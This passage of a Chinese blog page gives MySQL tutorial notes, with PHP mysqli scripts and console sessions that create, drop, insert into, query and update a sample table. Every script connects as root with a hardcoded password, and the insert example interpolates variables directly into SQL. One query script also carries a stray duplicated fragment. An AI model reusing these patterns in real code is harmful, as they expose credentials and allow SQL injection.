是换行符标识，不要复制。</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&lt;br /&gt;&#x27;;</span><br><span class="line">$sql = &quot;CREATE TABLE runoob_tbl( &quot;.</span><br><span class="line">        &quot;runoob_id INT NOT NULL AUTO_INCREMENT, &quot;.</span><br><span class="line">        &quot;runoob_title VARCHAR(100) NOT NULL, &quot;.</span><br><span class="line">        &quot;runoob_author VARCHAR(40) NOT NULL, &quot;.</span><br><span class="line">        &quot;submission_date DATE, &quot;.</span><br><span class="line">        &quot;PRIMARY KEY ( runoob_id ))ENGINE=InnoDB DEFAULT CHARSET=utf8; &quot;;</span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;数据表创建失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据表创建成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h4><p><code>DROP TABLE table_name ;</code></p><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&lt;br /&gt;&#x27;;</span><br><span class="line">$sql = &quot;DROP TABLE runoob_tbl&quot;;</span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;数据表删除失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据表删除成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@host# mysql -u root -p password;</span><br><span class="line">Enter password:*******</span><br><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; INSERT INTO runoob_tbl </span><br><span class="line">    -&gt; (runoob_title, runoob_author, submission_date)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&quot;学习 PHP&quot;, &quot;菜鸟教程&quot;, NOW());</span><br><span class="line">Query OK, 1 rows affected, 1 warnings (0.01 sec)</span><br><span class="line">mysql&gt; INSERT INTO runoob_tbl</span><br><span class="line">    -&gt; (runoob_title, runoob_author, submission_date)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&quot;学习 MySQL&quot;, &quot;菜鸟教程&quot;, NOW());</span><br><span class="line">Query OK, 1 rows affected, 1 warnings (0.01 sec)</span><br><span class="line">mysql&gt; INSERT INTO runoob_tbl</span><br><span class="line">    -&gt; (runoob_title, runoob_author, submission_date)</span><br><span class="line">    -&gt; VALUES</span><br><span class="line">    -&gt; (&quot;JAVA 教程&quot;, &quot;RUNOOB.COM&quot;, &#x27;2016-05-06&#x27;);</span><br><span class="line">Query OK, 1 rows affected (0.00 sec)</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><h4 id="读取数据表："><a href="#读取数据表：" class="headerlink" title="读取数据表："></a>读取数据表：</h4><p>select * from runoob_tbl;</p><p>脚本插入数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&lt;br /&gt;&#x27;;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$runoob_title = &#x27;学习 Python&#x27;;</span><br><span class="line">$runoob_author = &#x27;RUNOOB.COM&#x27;;</span><br><span class="line">$submission_date = &#x27;2016-03-06&#x27;;</span><br><span class="line"> </span><br><span class="line">$sql = &quot;INSERT INTO runoob_tbl &quot;.</span><br><span class="line">        &quot;(runoob_title,runoob_author, submission_date) &quot;.</span><br><span class="line">        &quot;VALUES &quot;.</span><br><span class="line">        &quot;(&#x27;$runoob_title&#x27;,&#x27;$runoob_author&#x27;,&#x27;$submission_date&#x27;)&quot;;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;无法插入数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据插入成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="查询数据表"><a href="#查询数据表" class="headerlink" title="查询数据表"></a>查询数据表</h4><p>脚本查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;SELECT runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        FROM runoob_tbl&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 mysqli_fetch_array 测试&lt;/h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#x27;runoob_id&#x27;]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_title&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;submission_date&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;   &quot;&lt;td&gt;&#123;$row[&#x27;runoob_title&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;submission_date&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="%7Bfilename%7D/image-20211227140317929.png" alt="image-20211227140317929"></p><p> 使用mysqli_fetch_assoc()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost:3306&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;SELECT runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        FROM runoob_tbl&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 mysqli_fetch_assoc 测试&lt;/h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_assoc($retval))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#x27;runoob_id&#x27;]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_title&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;submission_date&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>实例使用 <strong>MYSQLI_NUM</strong> 参数显示数据表 runoob_tbl 的所有记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost:3306&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;SELECT runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        FROM runoob_tbl&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 mysqli_fetch_array 测试&lt;/h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_array($retval, MYSQLI_NUM))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[0]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[1]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[2]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[3]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>内存释放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">// 释放内存</span><br><span class="line">mysqli_free_result($retval);</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="where子句"><a href="#where子句" class="headerlink" title="where子句"></a>where子句</h4><p>SQL SELECT 语句来读取数据。</p><p>有条件地从表中选取数据，可将 WHERE 子句添加到 SELECT 语句</p><p>以下是 SQL SELECT 语句使用 WHERE 子句从数据表中读取数据的通用语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT field1, field2,...fieldN FROM table_name1, table_name2...</span><br><span class="line">[WHERE condition1 [AND [OR]] condition2.....</span><br></pre></td></tr></table></figure><ul><li>查询语句中你可以使用一个或者多个表，表之间使用逗号**,** 分割，并使用WHERE语句来设定查询条件。</li><li>你可以在 WHERE 子句中指定任何条件。</li><li>你可以使用 AND 或者 OR 指定一个或多个条件。</li><li>WHERE 子句也可以运用于 SQL 的 DELETE 或者 UPDATE 命令。</li><li>WHERE 子句类似于程序语言中的 if 条件，根据 MySQL 表中的字段值来读取指定的数据。</li></ul><p>以下为操作符列表，可用于 WHERE 子句中。</p><p>下表中实例假定 A 为 10, B 为 20</p><table><thead><tr><th align="left">操作符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">=</td><td align="left">等号，检测两个值是否相等，如果相等返回true</td><td align="left">(A = B) 返回false。</td></tr><tr><td align="left">&lt;&gt;, !=</td><td align="left">不等于，检测两个值是否相等，如果不相等返回true</td><td align="left">(A != B) 返回 true。</td></tr><tr><td align="left">&gt;</td><td align="left">大于号，检测左边的值是否大于右边的值, 如果左边的值大于右边的值返回true</td><td align="left">(A &gt; B) 返回false。</td></tr><tr><td align="left">&lt;</td><td align="left">小于号，检测左边的值是否小于右边的值, 如果左边的值小于右边的值返回true</td><td align="left">(A &lt; B) 返回 true。</td></tr><tr><td align="left">&gt;=</td><td align="left">大于等于号，检测左边的值是否大于或等于右边的值, 如果左边的值大于或等于右边的值返回true</td><td align="left">(A &gt;= B) 返回false。</td></tr><tr><td align="left">&lt;=</td><td align="left">小于等于号，检测左边的值是否小于或等于右边的值, 如果左边的值小于或等于右边的值返回true</td><td align="left">(A &lt;= B) 返回 true。</td></tr></tbody></table><p>如果我们想在 MySQL 数据表中读取指定的数据，WHERE 子句是非常有用的。</p><p>使用主键来作为 WHERE 子句的条件查询是非常快速的。</p><p>如果给定的条件在表中没有任何匹配的记录，那么查询不会返回任何数据</p><p>以下实例将读取 runoob_tbl 表中 runoob_author 字段值为 Sanjay 的所有记录：</p><h5 id="SQL-SELECT-WHERE-子句"><a href="#SQL-SELECT-WHERE-子句" class="headerlink" title="SQL SELECT WHERE 子句"></a>SQL SELECT WHERE 子句</h5><p><code>SELECT * from runoob_tbl WHERE runoob_author=&#39;菜鸟教程&#39;;</code></p><p>可以使用 BINARY 关键字来设定 WHERE 子句的字符串比较是区分大小写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * from runoob_tbl WHERE BINARY runoob_author=&#x27;runoob.com&#x27;;</span><br><span class="line">Empty set (0.01 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; SELECT * from runoob_tbl WHERE BINARY runoob_author=&#x27;RUNOOB.COM&#x27;;</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| runoob_id | runoob_title  | runoob_author | submission_date |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| 3         | JAVA 教程   | RUNOOB.COM    | 2016-05-06      |</span><br><span class="line">| 4         | 学习 Python | RUNOOB.COM    | 2016-03-06      |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">// 读取 runoob_author 为 RUNOOB.COM 的数据</span><br><span class="line">$sql = &#x27;SELECT runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        FROM runoob_tbl</span><br><span class="line">        WHERE runoob_author=&quot;RUNOOB.COM&quot;&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 MySQL WHERE 子句测试&lt;h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#x27;runoob_id&#x27;]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_title&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;submission_date&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">// 释放内存</span><br><span class="line">mysqli_free_result($retval);</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="update更新"><a href="#update更新" class="headerlink" title="update更新"></a>update更新</h4><p>我们需要修改或更新 MySQL 中的数据，我们可以使用 SQL UPDATE 命令来操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; UPDATE runoob_tbl SET runoob_title=&#x27;学习 C++&#x27; WHERE runoob_id=3;</span><br><span class="line">Query OK, 1 rows affected (0.01 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; SELECT * from runoob_tbl WHERE runoob_id=3;</span><br><span class="line">+-----------+--------------+---------------+-----------------+</span><br><span class="line">| runoob_id | runoob_title | runoob_author | submission_date |</span><br><span class="line">+-----------+--------------+---------------+-----------------+</span><br><span class="line">| 3         | 学习 C++   | RUNOOB.COM    | 2016-05-06      |</span><br><span class="line">+-----------+--------------+---------------+-----------------+</span><br><span class="line">1 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // 